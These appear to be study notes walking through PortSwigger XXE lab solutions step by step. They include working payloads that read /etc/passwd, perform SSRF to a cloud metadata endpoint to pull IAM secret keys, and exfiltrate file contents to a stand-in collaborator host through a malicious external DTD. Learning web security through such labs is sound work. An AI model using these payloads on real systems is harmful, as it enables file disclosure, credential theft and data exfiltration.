
## Recon

- You can filter for somthing in this string to identify XML being used in a request.
```xml
<?xml version="1.0" encoding="UTF-8"?>
```

## [Exploiting XXE using external entities to retrieve files](https://portswigger.net/web-security/xxe/lab-exploiting-xxe-to-retrieve-files)

- Look for XML being sent in a request.
- Insert the following external entity definition in between the XML declaration and the `stockCheck` element:
```xml
<!DOCTYPE test [ <!ENTITY xxe SYSTEM "file:///etc/passwd"> ]>
```

- Replace the `productId` number with a reference to the external entity: `&xxe;`. The response should contain "Invalid product ID:" followed by the contents of the `/etc/passwd` file.

## [Exploiting XXE to perform SSRF attacks](https://portswigger.net/web-security/xxe/lab-exploiting-xxe-to-perform-ssrf)


- Look for XML being sent in a request.
- Insert the following external entity definition in between the XML declaration and the `stockCheck` element:
    
    `<!DOCTYPE test [ <!ENTITY xxe SYSTEM "http://169.254.169.254/"> ]>`
- Replace the `productId` number with a reference to the external entity: `&xxe;`. The response should contain "Invalid product ID:" followed by the response from the metadata endpoint, which will initially be a folder name.
- Iteratively update the URL in the DTD to explore the API until you reach `/latest/meta-data/iam/security-credentials/admin`. This should return JSON containing the `SecretAccessKey`.

## [Blind XXE with out-of-band interaction](https://portswigger.net/web-security/xxe/blind/lab-xxe-with-out-of-band-interaction)

- [ ]  Open the lab, navigate to any product page and click **Check stock**
- [ ]  In Burp Suite, intercept the resulting POST request
- [ ]  Send the request to Repeater
- [ ]  Open the **Collaborator** tab and copy your subdomain
- [ ]  In Repeater, locate the XML body — it will contain a `<stockCheck>` element
- [ ]  Inject an external entity definition between the XML declaration and `<stockCheck>`:

```xml
  <!DOCTYPE stockCheck [ <!ENTITY xxe SYSTEM "http://YOUR-COLLABORATOR-SUBDOMAIN"> ]>
```

- [ ]  Replace the value inside `<productId>` with a reference to the entity:

```xml
  <productId>&xxe;</productId>
```

- [ ]  Send the request
- [ ]  Switch to the Collaborator tab and click **Poll now**
- [ ]  Confirm DNS and HTTP interactions appear — lab solved ✅

**Key concept:** The XML parser resolves the external entity by making an outbound HTTP/DNS request to your Collaborator server. Since the response isn't reflected back in the app, out-of-band interaction is the only way to confirm the vulnerability is present.

## [Blind XXE with out-of-band interaction via XML parameter entities](https://portswigger.net/web-security/xxe/blind/lab-xxe-with-out-of-band-interaction-using-parameter-entities)

- [ ]  Open the lab, navigate to any product page and click **Check stock**
- [ ]  In Burp Suite, intercept the resulting POST request
- [ ]  Send the request to Repeater
- [ ]  Open the **Collaborator** tab and copy your subdomain
- [ ]  In Repeater, inject a **parameter entity** definition between the XML declaration and `<stockCheck>` — note the `%` prefix instead of `&`:

xml

```xml
  <!DOCTYPE stockCheck [<!ENTITY % xxe SYSTEM "http://YOUR-COLLABORATOR-SUBDOMAIN"> %xxe; ]>
```

- [ ]  Leave `<productId>` and `<storeId>` as-is — no need to reference the entity in the body this time
- [ ]  Send the request
- [ ]  Switch to the Collaborator tab and click **Poll now**
- [ ]  Confirm DNS and HTTP interactions appear — lab solved ✅

**Key concept:** This lab blocks regular external entities (`&xxe;`), so you switch to _parameter entities_ (`%xxe;`), which are declared and immediately referenced within the DTD itself — no reference needed in the document body. This bypasses filters that only look for `&entity;` patterns in element content.

## [Exploiting blind XXE to exfiltrate data using a malicious external DTD](https://portswigger.net/web-security/xxe/blind/lab-xxe-with-out-of-band-exfiltration)

**Step 1 — Set up Burp Collaborator**

- [ ]  Open the **Collaborator** tab in Burp Suite Pro
- [ ]  Click **Copy to clipboard** to grab your unique Collaborator subdomain

**Step 2 — Host a malicious DTD on the exploit server**

- [ ]  Click **Go to exploit server** in the lab
- [ ]  Paste the following into the exploit server body, replacing the placeholder with your Collaborator subdomain:


```xml
  <!ENTITY % file SYSTEM "file:///etc/hostname">
  <!ENTITY % eval "<!ENTITY &#x25; exfil SYSTEM 'http://YOUR-COLLABORATOR-SUBDOMAIN/?x=%file;'>">
  %eval;
  %exfil;
```

- [ ]  Click **Store**, then **View exploit** and copy the URL of your hosted DTD

**Step 3 — Inject the DTD reference into the stock check request**

- [ ]  Navigate to a product page and click **Check stock**
- [ ]  Intercept the POST request in Burp Suite and send it to Repeater
- [ ]  Insert the following between the XML declaration and `<stockCheck>`, using your exploit server DTD URL:

```xml
  <!DOCTYPE foo [<!ENTITY % xxe SYSTEM "YOUR-DTD-URL"> %xxe;]>
```

- [ ]  Send the request

**Step 4 — Collect the exfiltrated data**

- [ ]  Go to the **Collaborator** tab and click **Poll now**
- [ ]  Find the HTTP interaction — the query string `?x=` will contain the contents of `/etc/hostname`
- [ ]  Submit the hostname value to solve the lab ✅

**Key concept:** Because the response isn't reflected, data can't be read directly. Instead, a chained parameter entity in an externally hosted DTD reads `/etc/hostname` and appends its value to an outbound HTTP request to Collaborator — smuggling the file contents out via the URL.

## [Exploiting blind XXE to retrieve data via error messages](https://portswigger.net/web-security/xxe/blind/lab-xxe-with-data-retrieval-via-error-messages)

- Look for XML being sent in a request.
- Load the following DTD file into the exploit server:
```xml
<!ENTITY % file SYSTEM "file:///etc/passwd"> 
<!ENTITY % eval "<!ENTITY &#x25; exfil SYSTEM 'file:///invalid/%file;'>"> 
%eval; 
%exfil;
```
- View the exploit and take note of the url
- Insert the following external entity definition in between the XML declaration and the `stockCheck` element:
	    ```
	  <!DOCTYPE foo [<!ENTITY % xxe SYSTEM "YOUR-DTD-URL"> %xxe;]>  
	    ```
    
- You should see an error message containing the contents of the `/etc/passwd` file.
## [Exploiting XInclude to retrieve files](https://portswigger.net/web-security/xxe/lab-xinclude-attack)

- Inject **<>** into all parameters and look for XML errors. This indicates the value is being parsed by an XML external entity.
- Inject the following payload into the parameter:
```xml
<foo xmlns:xi="http://www.w3.org/2001/XInclude"><xi:include parse="text" href="file:///etc/passwd"/></foo>
```

## [Exploiting XXE via image file upload](https://portswigger.net/web-security/xxe/lab-xxe-via-file-upload)

- Check if XML is being sent in a request 
- If xml is in an image body in the request replace the entire xml with the following payload:
```xml
`<?xml version="1.0" standalone="yes"?><!DOCTYPE test [ <!ENTITY xxe SYSTEM "file:///etc/hostname" > ]><svg width="128px" height="128px" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" version="1.1"><text font-size="16" x="0" y="16">&xxe;</text></svg>`
```
- You should see the result in the image if it is vulnerable
